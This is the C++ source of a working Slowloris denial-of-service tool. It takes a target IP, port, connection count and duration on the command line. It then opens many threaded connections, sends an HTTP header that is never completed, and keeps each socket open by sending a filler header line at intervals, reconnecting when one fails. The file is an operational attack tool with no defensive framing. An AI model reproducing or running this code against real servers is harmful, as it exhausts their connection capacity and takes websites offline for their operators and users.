#include <iostream>
#include <cstdlib>
#include <pthread.h>
#include <errno.h>
#include <fcntl.h>

using namespace std;

#include "slowloris.h"


#define REFRESH_TIME_MS 100
#define REFRESH_CNT     10
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int alive_threads;

pthread_mutex_t mutex_request_cnt = PTHREAD_MUTEX_INITIALIZER;
int request_cnt;


SlowLoris::SlowLoris(int argc, char **argv){
	int c;
	while ((c = getopt(argc, argv, "d:D:t:c:T:")) != -1) 
	{
		switch (c)
		{
		case 'd':
			target = optarg;
			break;
		case 'D':
			port = atoi(optarg);
			break;
		case 't':
			timeout = atoi(optarg);
			break;
		case 'c':
			con_nbr = atoi(optarg);
			break;
		case 'T':
			duration = atoi(optarg);
			break;
		default:
			break;
		}
	}
        printf("\n*-------------------- Slowloris attack starts --------------------*\n"
		"Parameters of attack: \n"
		"Target IP: %s  Port: %d  Timeout: %d\nNumber of connections: %d \n\n"
		, target, port, timeout, con_nbr);

	bzero(&servaddr, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr(target);
	servaddr.sin_port = htons(port);
}


void SlowLoris::run(){
	pthread_t *threads = new pthread_t[con_nbr];
	int rc;
	int i;
	SlowLorisParams *params = new SlowLorisParams[con_nbr];
	
        alive_threads = con_nbr;
        int request_cnt_old = 0;
        request_cnt = 0;
        
	for( i=0; i < con_nbr; i++ ){
		srand(time(NULL));
		
		params[i].id = i;
		params[i].servaddr = servaddr;
		params[i].timeout = timeout;		// timeout na vlakno
                params[i].duration = duration;
                params[i].con_nbr = con_nbr;

		rc = pthread_create(&threads[i], NULL, &SlowLoris::slowLorisThread, (void*)&params[i]);
	
		if (rc){ 
			cout << "Error:unable to create thread," << rc << endl;
 			break;
		}
	}
        
        time_t startTime = time(NULL);
                
        while(1){
            time_t curTime = time(NULL);
            if((curTime-startTime)> duration){
                exit(0);
            }
            printf("\rThreads:%8d\tHeaders send: %8d Req/sec: %5d Time:%ld sec\t\t\t\t\t", alive_threads, request_cnt,request_cnt-request_cnt_old, (long)curTime-startTime);
            fflush(stdout);
            request_cnt_old = request_cnt;
            usleep(1000000);
        }                    
	
}


//***************************************
void* SlowLoris::slowLorisThread(void *threadid){
        usleep(rand() % 100000 + 50000);
    
  	char *header = "GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0 .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n";
	char *keep_alive = "X-a: b\r\n";
        
	struct SlowLorisParams *params;
   	params = (struct SlowLorisParams *) threadid;

	int sock;
        
        int error_cnt = 0;
        
        struct timeval timeout;      
        timeout.tv_sec = 4;
        timeout.tv_usec = 0;
        

        while(1){
            
                // create connections
                // socket
                if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                        if(error_cnt == REFRESH_CNT){
                            pthread_mutex_lock(&mutex);
                            alive_threads--;                       
                            pthread_mutex_unlock(&mutex);			
                            return NULL;
                        }
                        else{
                            error_cnt++;
                            usleep(REFRESH_TIME_MS*1000);
                            continue;
                        }
                }
                /*
                if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0){
                    
                }
        

                if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)) < 0){
                    
                }                                    
                 */
                // connect
                if (connect(sock, (SOCKADDR *)&params->servaddr, sizeof(params->servaddr)) == -1) {
                        if(error_cnt == REFRESH_CNT){
                            pthread_mutex_lock(&mutex);
                            alive_threads--;                       
                            pthread_mutex_unlock(&mutex);
                            close(sock);
                            return NULL;
                        }
                        else{
                            error_cnt++;
                            usleep(REFRESH_TIME_MS*1000);
                            continue;
                        }
                }

                // send header
                if (send(sock, header, strlen(header), 0) < 0) {
                        if(error_cnt == REFRESH_CNT){
                            pthread_mutex_lock(&mutex);
                            alive_threads--;                       
                            pthread_mutex_unlock(&mutex);	
                            close(sock);
                            return NULL;
                        }
                        else{
                            error_cnt++;
                            usleep(REFRESH_TIME_MS*1000);
                            continue;
                        }
                }       

                error_cnt = 0;
                
                //set no blocking
                fcntl(sock, F_SETFL, fcntl(sock, F_GETFL, 0) | O_NONBLOCK);
               
                // sons stay in loop
                while (1) {  
                    
                    // send keep alive
                    if (send(sock , keep_alive, strlen(keep_alive), 0) < 0) {
                        // kvuli no blocking jenom jednou                        
                        close(sock);
                        break;
                    }
                    else {
                         pthread_mutex_lock(&mutex_request_cnt);
                         request_cnt++;
                         pthread_mutex_unlock(&mutex_request_cnt);
                    } 
                    sleep(params->timeout); 
                }   
        }
         
}
